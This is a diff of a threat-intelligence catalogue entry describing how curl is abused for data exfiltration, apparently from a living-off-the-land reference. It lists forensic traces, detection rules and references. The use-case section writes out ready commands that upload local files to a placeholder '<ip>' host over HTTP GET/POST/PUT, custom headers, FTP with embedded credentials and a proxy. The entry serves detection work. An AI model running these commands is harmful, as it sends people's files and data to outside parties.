@@ -8,7 +8,6 @@ Description: >
   It is frequently abused by threat actors for exfiltration because it supports flexible flags for uploading files,
   injecting data into headers, sending encoded payloads, and routing through proxies. Its native presence on most operating systems
   makes it ideal for stealthy data exfiltration with minimal dependencies or visibility.
-
 Category: native
 Platform:
   - Windows
@@ -16,7 +15,6 @@ Platform:
   - macOS
 Execution:
   - cli
-
 Capabilities:
   - HTTP-request             # Send GET/POST/PUT requests for exfiltration over HTTP(S).
   - HTTPS-request            # Encrypts exfiltrated data in transit via TLS.
@@ -28,7 +26,6 @@ Capabilities:
   - user-agent-manipulation  # Spoof User-Agent to mimic browsers or system utilities.
   - encrypted-transfer       # Uses TLS/SSL by default for HTTP/S.
   - background-execution     # Commonly run in scripts or background jobs for automation.
-
 Forensics:
   BinaryLocations:
     - /usr/bin/curl
@@ -72,14 +69,11 @@ Forensics:
       - 'ftp://*'
       - 'Proxy-Authorization'
   ScheduledTask: []
-
 ThreatActors:
   - generic
-
 Tags:
   - ransomware
   - apt
-
 UseCases:
   - Title: URL-encoded GET request
     Description: Encode file content into a URL parameter and send via GET request.
@@ -87,78 +81,61 @@ UseCases:
       $data = Get-Content "$env:USERPROFILE\Documents\data.csv" | Out-String
       $encoded = [uri]::EscapeDataString($data)
       Invoke-Expression "curl http://<ip>:8080/exfil?data=$encoded"
-
   - Title: Base64-encoded GET request
     Description: Encode file content in Base64 and exfiltrate via GET parameter.
     Command: |
       $b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-Content data.csv -Raw)))
       curl "http://<ip>:8080?payload=$b64"
-
   - Title: HTTP POST with --data-binary
     Description: Upload a file using POST with raw binary data.
     Command: |
       curl -X POST http://<ip>:8080/upload --data-binary "@C:\data.csv"
-
   - Title: HTTP PUT with --upload-file
     Description: Upload a local file to an HTTP server via PUT.
     Command: |
       curl -X PUT http://<ip>:8080/out.zip --upload-file "C:\file.zip"
-
   - Title: Directory exfiltration loop
     Description: Automate uploads of multiple files in a folder using PowerShell.
     Command: |
       Get-ChildItem "C:\Reports\*.csv" | ForEach-Object {
         curl -T $_.FullName http://<ip>:8080/$($_.Name)
       }
-
   - Title: Multipart form upload
     Description: Simulate legitimate browser-based uploads using multipart/form-data.
     Command: |
       curl -F "file=@C:\secret.zip" http://<ip>:8080/upload
-
   - Title: Custom header exfiltration
     Description: Hide data in HTTP headers to bypass DLP or content inspection.
     Command: |
       curl -H "X-Data: $(Get-Content C:\data.csv -Raw)" http://<ip>:8080/
-
   - Title: FTP file upload
     Description: Upload data using FTP with embedded credentials.
     Command: |
       curl --upload-file "C:\data.csv" ftp://ftpuser:pass@<ip>/data.csv
-
   - Title: Proxy-assisted upload
     Description: Route uploads through a proxy server to obscure destination.
     Command: |
       curl -x http://127.0.0.1:8080 -T "C:\secret.csv" http://<ip>:8080/secret.csv
-
 Detection:
   - Type: CLI Pattern Matching
     Description: Detect use of curl with upload-related flags such as `--upload-file`, `--data-binary`, or `--form`. These often indicate outbound file transfer attempts.
-
   - Type: Network Exfiltration via HTTP/S
     Description: Monitor for outbound HTTP POST or PUT requests from endpoints using curl to external destinations. This includes detection of uploads to unknown or rare domains.
-
   - Type: Custom Header Abuse
     Description: Alert on the presence of sensitive content in non-standard headers (e.g., `X-Data`) used by curl, especially when paired with small payloads or encoded content.
-
   - Type: Proxy-based Exfiltration
     Description: Detect curl traffic routed via the `--proxy` flag, particularly when used to reach external or rarely used proxy endpoints. Look for uploads that occur during off-hours or bypass traditional network paths.
-
   - Type: FTP Usage from User Endpoints
     Description: Identify FTP upload attempts initiated from curl, especially when embedded credentials are present or when FTP is otherwise uncommon in the environment.
-
   - Type: Sigma Detection Rule
     Description: Elastic detection rule for identifying curl-based exfiltration via command-line arguments or behavior patterns.
     Reference: https://www.elastic.co/guide/en/security/8.19/potential-data-exfiltration-through-curl.html
-
 Testing:
   - https://www.elastic.co/guide/en/security/8.19/potential-data-exfiltration-through-curl.html
-
 References:
   - https://unit42.paloaltonetworks.com/vice-society-ransomware-powershell/
   - https://attack.mitre.org/software/S0660/
   - https://attack.mitre.org/techniques/T1041/
   - https://www.trendmicro.com/en_us/research/23/a/attackers-abuse-native-utilities-for-data-exfiltration.html
   - https://www.mandiant.com/resources/blog/command-line-data-exfiltration
-
 LastModified: '2025-11-17'
